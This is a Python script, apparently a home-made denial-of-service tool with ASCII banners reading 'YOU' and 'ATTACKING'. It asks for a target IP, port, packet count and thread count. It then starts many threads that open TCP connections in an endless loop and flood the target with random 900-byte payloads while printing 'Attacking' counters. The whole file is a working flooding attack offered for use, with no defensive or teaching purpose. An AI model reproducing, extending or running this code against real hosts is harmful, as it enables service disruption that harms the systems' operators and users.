__import__("os").system("pip install termcolor")

import random
import threading
import socket
import os
import time
from termcolor import colored
os.system('cls')
print(colored(r"""
                                                                         
                                                                         
YYYYYYY       YYYYYYY     OOOOOOOOO     UUUUUUUU     UUUUUUUU            
Y:::::Y       Y:::::Y   OO:::::::::OO   U::::::U     U::::::U            
Y:::::Y       Y:::::Y OO:::::::::::::OO U::::::U     U::::::U            
Y::::::Y     Y::::::YO:::::::OOO:::::::OUU:::::U     U:::::UU            
YYY:::::Y   Y:::::YYYO::::::O   O::::::O U:::::U     U:::::U             
   Y:::::Y Y:::::Y   O:::::O     O:::::O U:::::D     D:::::U             
    Y:::::Y:::::Y    O:::::O     O:::::O U:::::D     D:::::U             
     Y:::::::::Y     O:::::O     O:::::O U:::::D     D:::::U             
      Y:::::::Y      O:::::O     O:::::O U:::::D     D:::::U             
       Y:::::Y       O:::::O     O:::::O U:::::D     D:::::U             
       Y:::::Y       O:::::O     O:::::O U:::::D     D:::::U             
       Y:::::Y       O::::::O   O::::::O U::::::U   U::::::U             
       Y:::::Y       O:::::::OOO:::::::O U:::::::UUU:::::::U             
    YYYY:::::YYYY     OO:::::::::::::OO   UU:::::::::::::UU              
    Y:::::::::::Y       OO:::::::::OO       UU:::::::::UU                
    YYYYYYYYYYYYY         OOOOOOOOO           UUUUUUUUU                  

                                                    Created by YOU""",'green'))

print(colored("\n===========================================================\n",'green'))
ip = str(input(colored('[+] IP: ','green')))
port = int(input(colored('[+] port:','green')))
packet = int(input(colored('[+] Packets:','green')))
thread = int(input(colored('[+] thread: ','green')))
time.sleep(1.5)
os.system('cls')
print(colored(r"""
                                                                           
 @@@@@@  @@@@@@@ @@@@@@@  @@@@@@   @@@@@@@ @@@  @@@ @@@ @@@  @@@  @@@@@@@  
@@!  @@@   @!!     @!!   @@!  @@@ !@@      @@!  !@@ @@! @@!@!@@@ !@@       
@!@!@!@!   @!!     @!!   @!@!@!@! !@!      @!@@!@!  !!@ @!@@!!@! !@! @!@!@ 
!!:  !!!   !!:     !!:   !!:  !!! :!!      !!: :!!  !!: !!:  !!! :!!   !!: 
 :   : :    :       :     :   : :  :: :: :  :   ::: :   ::    :   :: :: :  
                                                                           """,'green'))
print(colored('\n##################################################','red'))
time.sleep(2)
print(colored('\n[+] start....','green'))
time.sleep(1)
print(colored('\n3','green'))
time.sleep(1)
print(colored('\n2','green'))
time.sleep(1)
print(colored('\n1','green'))
time.sleep(1)
os.system('cls')

def syn():
    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb += 1
            print(colored('[+] Attacking '+ip +'>>>Sent: '+str(bb),'red'))
        except KeyboardInterrupt:
            h.close()
            print(colored('[+++] DONE !!!','green'))
            pass
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()
                            

                                        
                                                   
                                                                         
                                                                         
                                                                         
                                                                         
                                                                         
                                                                         
                                                                         
